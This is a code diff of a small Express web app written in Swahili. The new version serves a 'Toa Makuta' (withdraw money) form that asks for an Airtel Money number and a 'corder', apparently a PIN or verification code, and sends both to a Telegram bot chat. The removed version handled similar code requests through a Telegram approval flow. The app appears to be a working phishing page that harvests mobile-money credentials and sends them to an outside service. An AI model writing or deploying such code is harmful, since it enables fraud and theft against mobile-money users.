@@ -2,66 +2,21 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const app = express();
-app.use(bodyParser.json());
+const PORT = process.env.PORT || 3000;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-const TOKEN = process.env.TELEGRAM_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;
+app.use(bodyParser.urlencoded({ extended: true }));
 
-let pendingApprovals = {};
-
-// Hii inatumiwa na app yako kutuma ombi
-app.post('/send', async (req, res) => {
-    const { number, coder, id } = req.body;
-    pendingApprovals[id] = { number, coder };
-
-    const text = `🔔 Ombi Jipya la Airtel Money\nNamba: ${number}\nCoder: ${coder}\nID: ${id}`;
-
-    await axios.post(`${TELEGRAM_API}/sendMessage`, {
-        chat_id: CHAT_ID,
-        text: text,
-        reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_${id}` }]] }
-    });
-    res.json({ ok: true });
+app.get('/', (req, res) => {
+  res.send(`<!DOCTYPE html><html lang="sw"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Toa Makuta</title><style>body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.form-box{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px #ccc;width:90%;max-width:300px}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}button{width:100%;padding:12px;background:#e63946;color:white;border:none;border-radius:5px;font-size:16px}h2{text-align:center}</style></head><body><div class="form-box"><h2>Toa Makuta</h2><form action="/submit" method="POST"><label>Airtel Numero</label><input type="text" name="airtelNumero" placeholder="07XXXXXXXX" required><label>Corder</label><input type="text" name="corder" placeholder="Weka corder hapa" required><button type="submit">Toa Makuta</button></form></div></body></html>`);
 });
 
-// Hii ndio webhook ya Telegram
-app.post('/telegram', async (req, res) => {
-    const update = req.body;
-
-    if (update.callback_query) {
-        const callback = update.callback_query;
-        const id = callback.data.split('_')[1];
-        const data = pendingApprovals[id];
-
-        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: callback.id });
-
-        if (data) {
-            await axios.post(`${TELEGRAM_API}/editMessageText`, {
-                chat_id: callback.message.chat.id,
-                message_id: callback.message_id,
-                text: `🔔 Ombi Jipya la Airtel Money\nNamba: ${data.number}\nCoder: ${data.coder}\nID: ${id}\n\n✅ Imeapproved. Tuma coder mpya sasa:`
-            });
-            pendingApprovals[id].waitingForNewCoder = true;
-        }
-    }
-
-    if (update.message) {
-        const text = update.message.text;
-        for(let id in pendingApprovals) {
-            if(pendingApprovals[id].waitingForNewCoder) {
-                const oldData = pendingApprovals[id];
-                await axios.post(`${TELEGRAM_API}/sendMessage`, {
-                    chat_id: CHAT_ID,
-                    text: `✅ Coder imebadilishwa!\nNamba: ${oldData.number}\nCoder Mpya: ${text}\nID: ${id}`
-                });
-                delete pendingApprovals[id];
-                break;
-            }
-        }
-    }
-    res.sendStatus(200);
+app.post('/submit', async (req, res) => {
+  const { airtelNumero, corder } = req.body;
+  const message = `📦 *CORDER MPYA IMEINGIA* 📦\n\n*Airtel Numero*: ${airtelNumero}\n*Corder*: ${corder}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
+  res.send('<h2>✅ Imetumwa! Asante.</h2><a href="/">Rudi nyuma</a>');
 });
 
-app.get('/', (req, res) => res.send('Bot is running'));
-app.listen(10000, () => console.log('Running'));
+app.listen(PORT, () => console.log(`Running on ${PORT}`));
